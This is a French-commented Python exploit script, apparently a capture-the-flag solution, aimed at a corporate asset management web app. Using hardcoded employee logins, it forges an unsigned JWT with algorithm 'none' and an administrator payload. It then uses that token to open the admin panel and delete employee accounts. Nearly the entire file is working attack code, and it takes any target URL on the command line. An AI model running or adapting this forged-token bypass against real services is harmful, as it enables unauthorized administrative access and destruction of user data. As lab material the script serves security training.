#!/usr/bin/env python3
"""
JWT Authentication Bypass Exploit
Corporate Asset Management System

Auteur: CyberCTF Security Lab
Vulnérabilité: JWT 'none' algorithm bypass
"""

import requests
import base64
import json
import sys
import time
from urllib.parse import quote

class JWTBypassExploit:
    def __init__(self, base_url="http://localhost:3206"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def banner(self):
        """Affiche la bannière de l'exploit"""
        print("=" * 70)
        print("🔥 JWT AUTHENTICATION BYPASS EXPLOIT")
        print("🎯 Target: Corporate Asset Management System")
        print("🚀 Vulnerability: JWT 'none' algorithm bypass")
        print("=" * 70)
        print()
    
    def step1_login_employee(self):
        """Étape 1: Login avec un compte employé pour analyser le JWT"""
        print("📋 Étape 1: Login avec compte employé normal")
        print("-" * 50)
        
        # Comptes employés disponibles (selon app.py)
        accounts = [
            ('mitchell.parker', 'corporate2024'),
            ('sarah.johnson', 'finance789')
        ]
        
        for username, password in accounts:
            print(f"🔑 Tentative de connexion: {username}")
            
            login_data = {
                'username': username,
                'password': password
            }
            
            try:
                response = self.session.post(f"{self.base_url}/login", data=login_data, allow_redirects=False)
                
                if response.status_code in [302, 200]:
                    # Récupérer le token JWT depuis les cookies
                    auth_token = None
                    for cookie in self.session.cookies:
                        if cookie.name in ['auth_token', 'token']:
                            auth_token = cookie.value
                            break
                    
                    if auth_token:
                        print(f"✅ Connexion réussie ! Token reçu:")
                        print(f"   {auth_token[:50]}...")
                        
                        # Analyser le token
                        self.analyze_jwt(auth_token)
                        return auth_token
                    else:
                        print("❌ Connexion échouée - pas de token reçu")
                else:
                    print(f"❌ Échec connexion - Code: {response.status_code}")
            except Exception as e:
                print(f"❌ Erreur connexion: {e}")
        
        print("❌ Impossible de se connecter avec les comptes employés")
        return None
    
    def analyze_jwt(self, token):
        """Analyser la structure du JWT reçu"""
        print(f"\n🔍 Analyse du JWT:")
        print("-" * 30)
        
        try:
            # Séparer les parties du JWT
            parts = token.split('.')
            print(f"Parties JWT: {len(parts)}")
            
            # Décoder le header
            header_b64 = parts[0]
            # Ajouter du padding si nécessaire
            header_padded = header_b64 + '=' * (4 - len(header_b64) % 4)
            header_data = json.loads(base64.urlsafe_b64decode(header_padded))
            print(f"Header: {json.dumps(header_data, indent=2)}")
            
            # Décoder le payload
            payload_b64 = parts[1]
            payload_padded = payload_b64 + '=' * (4 - len(payload_b64) % 4)
            payload_data = json.loads(base64.urlsafe_b64decode(payload_padded))
            print(f"Payload: {json.dumps(payload_data, indent=2)}")
            
            # Signature
            signature = parts[2] if len(parts) > 2 else ""
            print(f"Signature: {signature[:20]}..." if signature else "Signature: (vide)")
            
            return header_data, payload_data, signature
            
        except Exception as e:
            print(f"❌ Erreur analyse JWT: {e}")
            return None, None, None
    
    def step2_forge_malicious_jwt(self):
        """Étape 2: Forger un JWT malicieux avec algorithm 'none'"""
        print(f"\n📋 Étape 2: Forge du JWT malicieux")
        print("-" * 50)
        
        # Header avec algorithm 'none' (REQUIS pour le bypass)
        malicious_header = {
            "alg": "none",
            "typ": "JWT"
        }
        
        # Payload avec les credentials administrateur (REQUIS pour le bypass)
        malicious_payload = {
            "sub": "administrator",  # MUST be exactly "administrator"
            "role": "admin",         # MUST be exactly "admin" 
            "department": "Management",
            "exp": int(time.time()) + 86400  # 24h expiration
        }
        
        print("🔨 Construction du JWT malicieux:")
        print(f"   Header: {json.dumps(malicious_header)}")
        print(f"   Payload: {json.dumps(malicious_payload)}")
        
        # Encoder en Base64 URL-safe
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(malicious_header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(malicious_payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        # JWT avec signature VIDE (REQUIS pour le bypass)
        malicious_jwt = f"{header_b64}.{payload_b64}."
        
        print(f"\n✅ JWT malicieux généré:")
        print(f"{malicious_jwt}")
        
        return malicious_jwt
    
    def step3_admin_access(self, malicious_jwt):
        """Étape 3: Utiliser le JWT malicieux pour accéder au panel admin"""
        print(f"\n📋 Étape 3: Test d'accès administrateur")
        print("-" * 50)
        
        # URL encoder le token pour éviter les problèmes
        encoded_jwt = quote(malicious_jwt, safe='')
        
        # Créer une nouvelle session avec le token malicieux
        exploit_session = requests.Session()
        exploit_session.cookies.set('auth_token', malicious_jwt)
        
        print(f"🔓 Tentative d'accès au panel admin...")
        
        try:
            # Accéder au panel admin
            response = exploit_session.get(f"{self.base_url}/admin", allow_redirects=False)
            
            if response.status_code == 200:
                print("✅ SUCCÈS ! Accès administrateur obtenu !")
                
                # Vérifier le contenu
                if "Administrator Panel" in response.text:
                    print("🎯 Panel administrateur accessible")
                    
                    # Extraire les informations sur les utilisateurs
                    self.extract_user_info(response.text)
                    
                    return True
                else:
                    print("⚠️  Accès obtenu mais contenu inattendu")
                    
            elif response.status_code == 302:
                print("❌ Redirection détectée - bypass échoué")
            elif response.status_code == 403:
                print("❌ Accès refusé - bypass échoué")
            else:
                print(f"❌ Réponse inattendue: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Erreur lors de l'accès admin: {e}")
        
        return False
    
    def extract_user_info(self, html_content):
        """Extraire les informations des utilisateurs depuis la page admin"""
        print(f"\n📊 Informations système extraites:")
        print("-" * 40)
        
        # Parser simple pour extraire les infos (sans BeautifulSoup)
        if "users" in html_content.lower():
            print("👥 Utilisateurs cibles détectés dans le système")
            
        # Chercher les patterns de statistiques
        import re
        
        # Extraire le nombre d'utilisateurs
        user_match = re.search(r'"Total Users".*?(\d+)', html_content, re.DOTALL)
        if user_match:
            user_count = user_match.group(1)
            print(f"   📈 Nombre d'utilisateurs: {user_count}")
            
        # Extraire le nombre d'actifs
        asset_match = re.search(r'"Total Assets".*?(\d+)', html_content, re.DOTALL)
        if asset_match:
            asset_count = asset_match.group(1)
            print(f"   💻 Nombre d'actifs: {asset_count}")
            
        print("🎯 Objectif: Supprimer tous les utilisateurs employés")
    
    def step4_delete_users(self, malicious_jwt):
        """Étape 4: Supprimer tous les utilisateurs employés"""
        print(f"\n📋 Étape 4: Suppression des utilisateurs cibles")
        print("-" * 50)
        
        # Session avec token administrateur
        admin_session = requests.Session()
        admin_session.cookies.set('auth_token', malicious_jwt)
        
        # Utilisateurs cibles à supprimer
        target_users = ['mitchell.parker', 'sarah.johnson']
        
        successful_deletions = 0
        
        for username in target_users:
            print(f"🗑️  Suppression de l'utilisateur: {username}")
            
            try:
                # Envoyer la requête de suppression
                response = admin_session.get(
                    f"{self.base_url}/admin/delete?username={username}",
                    allow_redirects=False
                )
                
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('success'):
                            print(f"   ✅ {username} supprimé avec succès")
                            successful_deletions += 1
                        else:
                            print(f"   ❌ Échec: {result.get('error', 'Erreur inconnue')}")
                    except:
                        # Si ce n'est pas du JSON, vérifier le contenu
                        if "success" in response.text.lower():
                            print(f"   ✅ {username} supprimé avec succès")
                            successful_deletions += 1
                        else:
                            print(f"   ❌ Réponse inattendue")
                else:
                    print(f"   ❌ Erreur HTTP: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Erreur lors de la suppression: {e}")
        
        print(f"\n📊 Résumé des suppressions:")
        print(f"   🎯 Utilisateurs ciblés: {len(target_users)}")
        print(f"   ✅ Suppressions réussies: {successful_deletions}")
        
        if successful_deletions == len(target_users):
            print("\n🏆 CHALLENGE RÉUSSI !")
            print("🎉 Tous les utilisateurs cibles ont été supprimés")
            self.check_final_state()
        else:
            print(f"\n⚠️  Challenge partiellement réussi ({successful_deletions}/{len(target_users)})")
    
    def check_final_state(self):
        """Vérifier l'état final du système"""
        print(f"\n📋 Vérification de l'état final")
        print("-" * 50)
        
        try:
            # Vérifier la page publique des utilisateurs
            response = self.session.get(f"{self.base_url}/users")
            
            if response.status_code == 200:
                if "No users have been registered" in response.text or "0 users" in response.text:
                    print("✅ Confirmation: Aucun utilisateur employé restant")
                    print("🎯 L'objectif du challenge a été atteint")
                else:
                    print("ℹ️  Il reste peut-être des utilisateurs dans le système")
            
        except Exception as e:
            print(f"⚠️  Impossible de vérifier l'état final: {e}")
    
    def run_exploit(self):
        """Exécuter l'exploit complet"""
        self.banner()
        
        print("🚀 Démarrage de l'exploitation JWT...")
        print()
        
        # Étape 1: Login employé (pour comprendre)
        print("Phase 1: Reconnaissance")
        employee_token = self.step1_login_employee()
        
        if not employee_token:
            print("❌ Impossible de continuer sans token de référence")
            return
        
        # Étape 2: Forge du JWT malicieux
        print("\nPhase 2: Exploitation")
        malicious_jwt = self.step2_forge_malicious_jwt()
        
        # Étape 3: Test d'accès admin
        admin_access = self.step3_admin_access(malicious_jwt)
        
        if not admin_access:
            print("❌ L'exploitation a échoué - vérifiez la configuration")
            return
        
        # Étape 4: Suppression des utilisateurs
        print("\nPhase 3: Impact")
        self.step4_delete_users(malicious_jwt)
        
        print(f"\n" + "=" * 70)
        print("🏁 EXPLOITATION TERMINÉE")
        print("📝 Rapport d'impact:")
        print("   • Bypass d'authentification JWT réussi")
        print("   • Élévation de privilèges vers administrateur")
        print("   • Suppression d'utilisateurs du système")
        print("   • Vulnérabilité: Acceptation algorithm 'none'")
        print("=" * 70)

def main():
    """Point d'entrée principal"""
    print("JWT Authentication Bypass Exploit Tool")
    print("Usage: python exploit_jwt_bypass.py [URL]")
    
    # URL par défaut
    base_url = "http://localhost:3206"
    
    # Permettre de spécifier une URL différente
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    
    print(f"Target: {base_url}")
    print()
    
    # Créer et exécuter l'exploit
    exploit = JWTBypassExploit(base_url)
    exploit.run_exploit()

if __name__ == "__main__":
    main()